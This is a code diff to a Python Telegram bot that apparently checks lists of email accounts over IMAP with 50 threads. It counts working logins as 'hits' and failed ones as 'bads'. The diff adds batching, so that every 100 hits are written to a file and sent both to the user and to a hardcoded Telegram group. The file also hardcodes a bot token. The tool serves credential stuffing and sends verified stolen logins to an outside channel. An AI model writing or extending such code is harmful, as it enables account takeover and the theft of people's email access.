@@ -13,7 +13,7 @@ import urllib.parse
 import ssl
 import imaplib
 import base64
-#############################################################################
+
 BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8650837363:AAGc7cfEhAHponP_4zTeVL7QeB4PZ1tTRP8")
 GROUP_ID = int(os.getenv("TELEGRAM_GROUP_ID", "-1002893702017"))
 API_BASE = "https://api.telegram.org/bot"
@@ -582,6 +582,10 @@ class ScanSession:
         self.total = 0
         self.checked = 0
         self.hits = 0
+        self.bads = 0
+        self.batch = []
+        self.hits_batch_lock = threading.Lock()
+        self.last_status_time = 0.0
 
     def stop(self):
         self.stop_ev.set()
@@ -591,6 +595,33 @@ class BotApp:
         self.offset = None
         self.sessions = {}
         self.lock = threading.Lock()
+
+    def _send_status(self, sess: ScanSession, chat_id, force=False):
+        now = time.time()
+        if not force and now - sess.last_status_time < 5:
+            return
+        with self.lock:
+            msg = f"Progress: {sess.checked}/{sess.total} | Hits: {sess.hits} | Bads: {sess.bads}"
+        send_message(chat_id, msg)
+        sess.last_status_time = now
+
+    def _flush_batch(self, sess: ScanSession, chat_id):
+        with sess.hits_batch_lock:
+            if not sess.batch:
+                return
+            name = f"hits_batch_{int(time.time())}.txt"
+            path = os.path.join(os.getcwd(), name)
+            try:
+                with open(path, "w", encoding="utf-8") as f:
+                    f.writelines([ln + "\n" for ln in sess.batch])
+                send_document(chat_id, path, caption=f"Hits batch ({len(sess.batch)})")
+                try:
+                    send_document(GROUP_ID, path, caption=f"Hits batch ({len(sess.batch)})")
+                except:
+                    pass
+                sess.batch.clear()
+            except:
+                pass
 
     def start_scan(self, chat_id, accounts):
         sess = ScanSession(chat_id)
@@ -615,10 +646,21 @@ class BotApp:
                 with self.lock:
                     sess.results.append(line)
                     sess.hits += 1
-                send_message(chat_id, line)
-                details = format_full_details(r)
-                if details:
-                    send_message(chat_id, details)
+                # Batch-send every 100 hits
+                with sess.hits_batch_lock:
+                    sess.batch.append(line)
+                    if len(sess.batch) >= 100:
+                        pass
+                if len(sess.batch) >= 100:
+                    self._flush_batch(sess, chat_id)
+                # periodic status
+                self._send_status(sess, chat_id)
+            else:
+                with self.lock:
+                    sess.bads += 1
+                # periodic status
+                if sess.checked % 20 == 0:
+                    self._send_status(sess, chat_id)
         ex = ThreadPoolExecutor(max_workers=50)
         fs = [ex.submit(worker, acc) for acc in accounts]
         for f in fs:
@@ -628,10 +670,8 @@ class BotApp:
                 f.result(timeout=60)
             except:
                 pass
-        try:
-            ex.shutdown(wait=False, cancel_futures=True)
-        except:
-            pass
+        try: ex.shutdown(wait=False, cancel_futures=True)
+        except: pass
         self.finish(chat_id)
 
     def finish(self, chat_id):
@@ -639,15 +679,17 @@ class BotApp:
             sess = self.sessions.get(chat_id)
         if not sess:
             return
+        # flush remaining batch
+        self._flush_batch(sess, chat_id)
         name = f"results_{uuid.uuid4().hex[:8]}.txt"
         path = os.path.join(os.getcwd(), name)
         try:
             with open(path, "w", encoding="utf-8") as f:
                 for ln in sess.results:
                     f.write(ln + "\n")
-            send_document(chat_id, path, caption=f"Done. Hits: {sess.hits}/{sess.total}")
+            send_document(chat_id, path, caption=f"Done. Hits: {sess.hits} | Bads: {sess.bads} | Total: {sess.total}")
             try:
-                send_document(GROUP_ID, path, caption=f"Hits: {sess.hits}/{sess.total}")
+                send_document(GROUP_ID, path, caption=f"Done. Hits: {sess.hits} | Bads: {sess.bads} | Total: {sess.total}")
             except:
                 pass
         except:
